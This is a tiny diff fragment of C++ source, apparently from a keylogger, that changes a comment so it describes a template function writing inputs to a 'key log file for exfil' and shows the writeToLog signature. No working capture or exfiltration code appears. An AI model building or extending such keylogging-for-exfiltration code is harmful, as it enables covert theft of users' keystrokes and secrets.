@@ -53,7 +53,7 @@ namespace IO
 		}
 	}
 
-	//Below is a template function which will take inputs and write it to our log file for exfil
+	//Below is a template function which will take inputs and write it to our key log file for exfil
 
 	template <typename T1>
 	std::string writeToLog(const T1 &input)
